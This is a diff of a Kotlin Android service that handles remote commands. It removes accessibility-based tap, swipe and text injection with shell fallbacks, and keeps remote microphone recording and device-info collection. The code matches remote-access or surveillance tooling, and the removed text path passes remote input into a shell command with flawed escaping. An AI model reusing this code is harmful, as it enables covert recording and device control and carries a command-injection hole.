@@ -335,135 +335,17 @@ class ConnectorService : Service() {
                 Pair(frame, "command_result")
             }
 
-            // ── Remote Control v2 — Pure Accessibility, no Shizuku ──────────
-            cmd.startsWith("input_tap_pct:") -> {
-                val p = cmd.removePrefix("input_tap_pct:").split(":")
-                val xp = p.getOrNull(0)?.toFloatOrNull() ?: 0f
-                val yp = p.getOrNull(1)?.toFloatOrNull() ?: 0f
-                Pair(injectTapPct(xp, yp), "command_result")
-            }
-            cmd.startsWith("input_longpress_pct:") -> {
-                val p = cmd.removePrefix("input_longpress_pct:").split(":")
-                val xp = p.getOrNull(0)?.toFloatOrNull() ?: 0f
-                val yp = p.getOrNull(1)?.toFloatOrNull() ?: 0f
-                Pair(injectLongPressPct(xp, yp), "command_result")
-            }
-            cmd.startsWith("input_swipe_pct:") -> {
-                val p = cmd.removePrefix("input_swipe_pct:").split(":")
-                val x1 = p.getOrNull(0)?.toFloatOrNull() ?: 0f
-                val y1 = p.getOrNull(1)?.toFloatOrNull() ?: 0f
-                val x2 = p.getOrNull(2)?.toFloatOrNull() ?: 0f
-                val y2 = p.getOrNull(3)?.toFloatOrNull() ?: 0f
-                val dur = p.getOrNull(4)?.toIntOrNull() ?: 300
-                Pair(injectSwipePct(x1, y1, x2, y2, dur), "command_result")
-            }
-            cmd.startsWith("input_key:") -> {
-                val key = cmd.removePrefix("input_key:")
-                // Try Accessibility first (Back/Home/Recents)
-                val handled = ControlAccessibilityService.dispatchKey(key)
-                if (handled) Pair("OK: $key (Accessibility)", "command_result")
-                else Pair(runShell("input keyevent $key"), "command_result")
-            }
-            cmd.startsWith("input_text:") -> {
-                val text = cmd.removePrefix("input_text:").replace("%s", " ")
-                val ok = ControlAccessibilityService.inputTextViaClipboard(applicationContext, text)
-                if (ok) Pair("OK: text input via clipboard paste", "command_result")
-                else Pair(runShell("input text '${text.replace("'", "\\'")}'"), "command_result")
-            }
-            cmd == "get_screen_size" -> Pair(getScreenSize(), "command_result")
-
             // ── Mic recording ──
             cmd.startsWith("record_mic:") -> {
                 val sec = cmd.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
                 Pair(recordMic(sec), "command_result")
             }
 
-            // ── RC Status ──
-            cmd == "rc_status" -> Pair(getRcStatus(), "command_result")
-
             // ── Misc ──
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
             cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
 
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
-        }
-    }
-
-    // ─────────────────────────────────────────
-    //  REMOTE CONTROL v2 — TOUCH INJECT
-    // ─────────────────────────────────────────
-
-    @Suppress("DEPRECATION")
-    private fun getDisplayMetrics(): android.util.DisplayMetrics {
-        val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
-        return android.util.DisplayMetrics().also { wm.defaultDisplay.getRealMetrics(it) }
-    }
-
-    private fun injectTapPct(xPct: Float, yPct: Float): String {
-        return try {
-            val m = getDisplayMetrics()
-            val x = (xPct.coerceIn(0f, 1f) * m.widthPixels).toInt()
-            val y = (yPct.coerceIn(0f, 1f) * m.heightPixels).toInt()
-
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchTapSync(x.toFloat(), y.toFloat())
-                return if (ok) "OK: tap ($x,$y) via Accessibility"
-                else runShell("input tap $x $y").let { "FALLBACK: $it" }
-            }
-            runShell("input tap $x $y")
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    private fun injectLongPressPct(xPct: Float, yPct: Float): String {
-        return try {
-            val m = getDisplayMetrics()
-            val x = (xPct.coerceIn(0f, 1f) * m.widthPixels).toInt()
-            val y = (yPct.coerceIn(0f, 1f) * m.heightPixels).toInt()
-
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchLongPressSync(x.toFloat(), y.toFloat())
-                return if (ok) "OK: long press ($x,$y) via Accessibility"
-                else runShell("input swipe $x $y $x $y 800").let { "FALLBACK: $it" }
-            }
-            runShell("input swipe $x $y $x $y 800")
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    private fun injectSwipePct(x1p: Float, y1p: Float, x2p: Float, y2p: Float, durMs: Int): String {
-        return try {
-            val m = getDisplayMetrics()
-            val x1 = (x1p.coerceIn(0f, 1f) * m.widthPixels).toInt()
-            val y1 = (y1p.coerceIn(0f, 1f) * m.heightPixels).toInt()
-            val x2 = (x2p.coerceIn(0f, 1f) * m.widthPixels).toInt()
-            val y2 = (y2p.coerceIn(0f, 1f) * m.heightPixels).toInt()
-            val dur = durMs.coerceIn(50, 3000)
-
-            if (ControlAccessibilityService.isAvailable()) {
-                val ok = ControlAccessibilityService.dispatchSwipeSync(
-                    x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), dur.toLong()
-                )
-                return if (ok) "OK: swipe ($x1,$y1)→($x2,$y2) ${dur}ms via Accessibility"
-                else runShell("input swipe $x1 $y1 $x2 $y2 $dur").let { "FALLBACK: $it" }
-            }
-            runShell("input swipe $x1 $y1 $x2 $y2 $dur")
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    @Suppress("DEPRECATION")
-    private fun getScreenSize(): String {
-        return try {
-            val m = getDisplayMetrics()
-            "${m.widthPixels}x${m.heightPixels}"
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    private fun getRcStatus(): String {
-        return buildString {
-            appendLine("=== Remote Control v2 Status ===")
-            appendLine("AccessibilityService: ${if (ControlAccessibilityService.isAvailable()) "✅ Active" else "❌ Not active — aktifkan di Settings > Accessibility > System Control Service"}")
-            appendLine("MediaProjection: ${if (MediaProjectionHolder.isAvailable()) "✅ Active" else "❌ Not active — buka app untuk grant izin layar"}")
-            appendLine("Shizuku: Removed (tidak diperlukan)")
-            appendLine("Screen size: ${getScreenSize()}")
         }
     }
 
